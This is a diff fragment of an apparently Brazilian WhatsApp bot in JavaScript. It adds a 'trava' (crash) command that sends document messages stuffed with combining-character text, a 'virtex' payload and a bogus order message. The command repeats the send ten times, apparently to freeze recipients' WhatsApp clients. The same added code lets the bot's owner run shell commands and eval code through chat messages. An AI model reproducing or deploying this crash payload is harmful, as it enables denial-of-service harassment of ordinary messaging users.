+  trick.prepareMessageFromContent(jid,{ "documentMessage": { 
+  "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", 
+  "mimetype": "Ml/Ml", 
+  "title": "■ 🦠̸̻᳚⃝ ླྀ𝑻𝒆𝒙𝒛𝒊𝒏𝑳𝒐𝒄𝒌 𝑼𝒍𝒕𝒊𝒎𝒂𝒕𝒆꣫🦠⃝̸̻𖬱ꪾ ■.nu    ${virtex9(prefix)}", 
+  "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", 
+  "fileLength": "28777", "height": 1080, "width": 1079, 
+  "mediaKey": 
+  "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", 
+  "fileEncSha256": 
+  "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", 
+  "directPath": 
+  "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", 
+  "mediaKeyTimestamp": 
+  "1610993486", 
+  "Thumbnail": fs.readFileSync(`./src/travafoto.png`),
+  "jpegThumbnail": fs.readFileSync(`./src/carrinho.jpeg`), }}, {quoted: {
+  key: {
+   participant: '0@s.whatsapp.net'
+  },
+  message: {
+   orderMessage: {
+    thumbnail: fs.readFileSync('./src/travafoto.png'),
+    itemCount: 9999,
+    status: 1,
+    surface: 1,
+    message: ` `,
+    orderTitle: ` `,
+    sellerJid: '0@s.whatsapp.net'
+   }
+  }
+ }
+})
+             trick.relayWAMessage(res)
+        }
+        doc(`\n`)
+        doc(`\n`)
+        doc(`\n`)
+        doc(`\n`)
+        doc(`\n`)
+        doc(`\n`)
+        doc(`\n`)
+        doc(`\n`)
+        doc(`\n`)
+        doc(`\n`)
+        break
+
+// sua cases de travas e etc            
+
+/* FIMMM */
+				
+default:
+if (isOwner) {
+if (budy.startsWith('$')){
+if (!mek.key.fromMe && !isOwner) return
+qur = budy.slice(2)
+exec(qur, (err, stdout) => {
+if (err) return reply(`${err}`)
+if (stdout) {
+reply(stdout)
+}
+})
+}
+if (isOwner) {
+if (budy.startsWith('>')) {
+console.log(color('[EVAL1]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`eval return`))
+try {
+let evaled = await eval(budy.slice(2))
+if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
+reply(`${evaled}`)
+} catch (err) {
+reply(`${err}`)
+}
+}
+}
+}
+}
+	} catch (e) {
+    e = String(e)
+    if (!e.includes("this.isZero") && !e.includes("jid")) {
+	console.log('Error : %s', color(e, 'red'))
+        }
+	// console.log(e)
+	}
+}
+
+
+	
+    
